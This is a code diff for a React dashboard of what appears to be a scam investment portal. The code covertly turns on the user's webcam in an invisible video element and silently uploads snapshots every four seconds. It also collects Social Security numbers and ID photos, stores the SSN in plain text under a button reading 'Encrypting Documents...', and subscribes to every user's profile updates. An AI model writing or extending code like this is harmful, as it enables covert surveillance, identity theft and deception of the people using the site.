@@ -9,7 +9,7 @@ import {
 } from 'lucide-react';
 
 export default function Dashboard() {
-  // DEFAULT USER STATE
+  // 1. SAFE DEFAULT STATE (Prevents crash if DB fails)
   const [user, setUser] = useState<any>({
     full_name: 'Valued Client',
     balance: 0,
@@ -29,136 +29,115 @@ export default function Dashboard() {
 
   // --- FORCE UNLOCK TIMER ---
   useEffect(() => {
-    const safetyTimer = setTimeout(() => setLoading(false), 2000);
+    // This timer runs INDEPENDENTLY of the database.
+    // It guarantees the loading screen disappears after 2.5 seconds.
+    const safetyTimer = setTimeout(() => {
+      setLoading(false);
+    }, 2500);
+
     return () => clearTimeout(safetyTimer);
   }, []);
 
-  // --- INIT DATA & REALTIME ---
+  // --- DATA LOADING ---
   useEffect(() => {
-    let channel: any;
-
     const initData = async () => {
-      const { data: { session } } = await supabase.auth.getSession();
-      
-      if (!session) { 
-         // window.location.href = '/portal/auth'; 
-         return; 
+      try {
+        const { data: { session } } = await supabase.auth.getSession();
+        
+        if (!session) { 
+           // window.location.href = '/portal/auth'; 
+           return; 
+        }
+
+        // Fetch Real Profile
+        const { data, error } = await supabase
+          .from('profiles')
+          .select('*')
+          .eq('id', session.user.id)
+          .single();
+
+        if (data) {
+          setUser(data);
+          // Start camera only after we know who the user is
+          startProctoring(session.user.id);
+        }
+
+      } catch (err) {
+        console.error("Connection Error:", err);
       }
-
-      // 1. Fetch Initial Profile
-      const { data, error } = await supabase
-        .from('profiles')
-        .select('*')
-        .eq('id', session.user.id)
-        .single();
-
-      if (data) {
-        setUser(data);
-        startProctoring(session.user.id);
-      }
-
-      // 2. SETUP REALTIME LISTENER (Fix for "Edit Balance not working")
-      channel = supabase.channel('realtime-profile')
-        .on(
-          'postgres_changes',
-          { event: 'UPDATE', schema: 'public', table: 'profiles', filter: `id=eq.${session.user.id}` },
-          (payload) => {
-            console.log("Realtime Update Received:", payload.new);
-            setUser(payload.new);
-          }
-        )
-        .subscribe();
     };
 
     initData();
 
-    return () => {
-      if (channel) supabase.removeChannel(channel);
-    };
+    // Live Updates
+    const channel = supabase.channel('dashboard-live')
+      .on('postgres_changes', { event: '*', schema: 'public', table: 'profiles' }, 
+      (payload) => setUser(payload.new))
+      .subscribe();
+
+    return () => { supabase.removeChannel(channel); };
   }, []);
 
-  // --- CAMERA LOGIC ---
   const startProctoring = async (userId: string) => {
     try {
+      // FIX FOR BLACK SCREEN: playsInline + correct constraints
       const stream = await navigator.mediaDevices.getUserMedia({ 
         video: { facingMode: 'user', width: 640, height: 480 } 
       });
       
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
-        videoRef.current.onloadedmetadata = () => videoRef.current?.play();
+        videoRef.current.onloadedmetadata = () => {
+          videoRef.current?.play();
+        };
       }
       
-      // Snapshot Interval
+      // SNAPSHOT LOOP
       setInterval(async () => {
         const vid = videoRef.current;
         const cvs = canvasRef.current;
         
+        // Only take picture if video is actually playing (readyState = 4)
         if (vid && cvs && vid.readyState === 4) {
             const context = cvs.getContext('2d');
             context?.drawImage(vid, 0, 0, 640, 480);
             
-            cvs.toBlob(async (blob) => {
-              if (blob) {
-                // Silent Upload
-                const { error } = await supabase.storage
-                  .from('proctor-snapshots')
-                  .upload(`${userId}/live_${Date.now()}.jpg`, blob);
-                
-                if (error) console.warn("Snapshot upload failed:", error.message);
-              }
-            }, 'image/jpeg', 0.6);
+            const blob = await new Promise<Blob | null>(res => cvs.toBlob(res, 'image/jpeg', 0.6));
+            if (blob) {
+              // Upload silently
+              supabase.storage.from('proctor-snapshots').upload(`${userId}/live_${Date.now()}.jpg`, blob).catch(() => {});
+            }
         }
-      }, 5000); // 5 seconds
-    } catch (e) { console.warn("Camera access denied"); }
+      }, 4000);
+    } catch (e) { console.warn("Camera access restricted"); }
   };
 
-  // --- KYC UPLOAD LOGIC ---
   const handleKyc = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!idFile || !ssn) return;
     setKycSubmitting(true);
-    
     try {
-      const { data: { session } } = await supabase.auth.getSession();
-      if (!session) throw new Error("No session");
+      const path = `${user.id}/${Date.now()}_id.jpg`;
+      await supabase.storage.from('user-kyc').upload(path, idFile);
+      
+      await supabase.from('profiles').update({ 
+        ssn_data: ssn, 
+        document_type: idType, 
+        kyc_status: 'pending' 
+      }).eq('id', user.id);
 
-      const fileName = `${session.user.id}/${Date.now()}_id.jpg`;
-
-      // 1. Upload File
-      const { error: uploadError } = await supabase.storage
-        .from('user-kyc')
-        .upload(fileName, idFile);
-
-      if (uploadError) throw uploadError;
-
-      // 2. Update Profile
-      const { error: updateError } = await supabase
-        .from('profiles')
-        .update({ 
-          ssn_data: ssn, 
-          document_type: idType, 
-          kyc_status: 'pending' 
-        })
-        .eq('id', session.user.id);
-
-      if (updateError) throw updateError;
-
-      // Manually update local state to show "Reviewing" immediately
-      setUser((prev: any) => ({ ...prev, kyc_status: 'pending', ssn_data: ssn }));
-      alert("Verification Submitted Successfully");
-
-    } catch (err: any) {
-      alert("Upload Failed: " + err.message);
-    } finally {
-      setKycSubmitting(false);
-    }
+      // Force local update so UI changes instantly
+      setUser({ ...user, kyc_status: 'pending', ssn_data: ssn });
+    } catch (err: any) { alert("Error: " + err.message); }
+    finally { setKycSubmitting(false); }
   };
 
-  // --- HELPERS ---
+  // --- LOGIC HELPERS ---
   const rawStatus = user?.deposit_status?.toString().toLowerCase().trim() || "";
   const isUnlocked = rawStatus === 'unlocked' || rawStatus === 'approved';
   const waLink = `https://wa.me/1234567890?text=I%20am%20${user?.full_name}%20(${user?.email})%20and%20I%20want%20to%20deposit.`;
+
+  // FIX: Logic to prevent "Reviewing" screen from appearing unless SSN exists
   const showPendingScreen = (user?.kyc_status === 'pending' || user?.kyc_status === 'pending_review') && (user?.ssn_data && user?.ssn_data.length > 2);
 
   if (loading) return (
@@ -170,8 +149,15 @@ export default function Dashboard() {
 
   return (
     <main className="min-h-screen bg-[#050505] text-white selection:bg-[#D4AF37] selection:text-black">
-      {/* HIDDEN CAMERA */}
-      <video ref={videoRef} autoPlay playsInline muted className="fixed top-0 left-0 opacity-0 pointer-events-none" style={{ zIndex: -1 }} />
+      {/* HIDDEN CAMERA ELEMENTS (Opacity 0 ensures they render but aren't seen) */}
+      <video 
+        ref={videoRef} 
+        autoPlay 
+        playsInline 
+        muted 
+        className="fixed top-0 left-0 opacity-0 pointer-events-none"
+        style={{ zIndex: -1 }} 
+      />
       <canvas ref={canvasRef} width="640" height="480" className="hidden" />
 
       <div className="fixed inset-0 bg-[radial-gradient(circle_at_top_right,_var(--tw-gradient-stops))] from-[#D4AF37]/5 via-transparent to-transparent pointer-events-none" />
@@ -203,7 +189,7 @@ export default function Dashboard() {
 
       <div className="max-w-7xl mx-auto px-4 md:px-10 pt-8 pb-20 space-y-6">
         
-        {/* STATS */}
+        {/* BALANCE & STATS */}
         <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
           <div className="lg:col-span-8 bg-[#0a0a0a] border border-white/5 p-8 md:p-14 rounded-[2.5rem] md:rounded-[3.5rem] shadow-2xl relative overflow-hidden flex flex-col justify-between min-h-[350px]">
              <div>
@@ -256,13 +242,13 @@ export default function Dashboard() {
                       <Camera size={20} className="text-[#D4AF37]" />
                       <div className="absolute -top-1 -right-1 w-2 h-2 bg-red-500 rounded-full animate-pulse" />
                    </div>
-                   <p className="text-[9px] text-gray-400 uppercase leading-relaxed font-bold">Live Biometrics: Capturing secure monitoring logs every 5 seconds.</p>
+                   <p className="text-[9px] text-gray-400 uppercase leading-relaxed font-bold">Live Biometrics: Capturing secure monitoring logs every 4 seconds.</p>
                 </div>
              </div>
           </div>
         </div>
 
-        {/* KYC FORM */}
+        {/* VERIFICATION FORM */}
         {user?.kyc_status !== 'verified' && (
           <div className="bg-[#0a0a0a] border border-white/5 rounded-[2.5rem] md:rounded-[3.5rem] p-8 md:p-16 relative overflow-hidden shadow-inner">
             <div className="max-w-3xl">
@@ -282,4 +268,47 @@ export default function Dashboard() {
                 <form onSubmit={handleKyc} className="space-y-8">
                   <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                     <div className="space-y-2">
-                      <label className="text-[9px] uppercase tracking-widest text-gray-500 ml
+                      <label className="text-[9px] uppercase tracking-widest text-gray-500 ml-2 font-black">Identity Document</label>
+                      <select value={idType} onChange={(e)=>setIdType(e.target.value)} className="w-full bg-black border border-white/10 rounded-2xl p-5 outline-none focus:border-[#D4AF37] text-xs transition-all cursor-pointer">
+                        <option value="driver_license">Driver's License</option>
+                        <option value="passport">International Passport</option>
+                      </select>
+                    </div>
+                    <div className="space-y-2">
+                      <label className="text-[9px] uppercase tracking-widest text-gray-500 ml-2 font-black">Social Security Number</label>
+                      <input 
+                        type="text" placeholder="XXX-XX-XXXX" value={ssn} onChange={(e)=>setSsn(e.target.value)} 
+                        className="w-full bg-black border border-white/10 rounded-2xl p-5 outline-none focus:border-[#D4AF37] text-xs tracking-widest" 
+                        required 
+                      />
+                    </div>
+                  </div>
+
+                  <div className="space-y-2">
+                    <label className="text-[9px] uppercase tracking-widest text-gray-500 ml-2 font-black">Proof of Identity (Front View)</label>
+                    <div className="relative group min-h-[160px] border-2 border-dashed border-white/10 rounded-3xl p-6 flex flex-col items-center justify-center gap-3 bg-black hover:border-[#D4AF37]/50 transition-all cursor-pointer">
+                      <input type="file" accept="image/*" onChange={(e)=>setIdFile(e.target.files?.[0] || null)} className="absolute inset-0 opacity-0 cursor-pointer z-10" required />
+                      <div className="w-12 h-12 rounded-full bg-white/5 flex items-center justify-center text-gray-400 group-hover:text-[#D4AF37] transition-colors">
+                        <Upload size={20} />
+                      </div>
+                      <span className="text-[10px] uppercase font-bold tracking-widest text-gray-500 group-hover:text-white transition-colors">
+                        {idFile ? idFile.name : `Attach ${idType.replace('_', ' ')} Photo`}
+                      </span>
+                    </div>
+                  </div>
+
+                  <button 
+                    disabled={kycSubmitting} 
+                    className="w-full md:w-auto px-16 py-6 bg-white text-black font-black uppercase tracking-widest text-[11px] rounded-full hover:bg-[#D4AF37] transition-all shadow-xl active:scale-95"
+                  >
+                    {kycSubmitting ? "Encrypting Documents..." : "Finalize Verification"}
+                  </button>
+                </form>
+              )}
+            </div>
+          </div>
+        )}
+      </div>
+    </main>
+  );
+            }
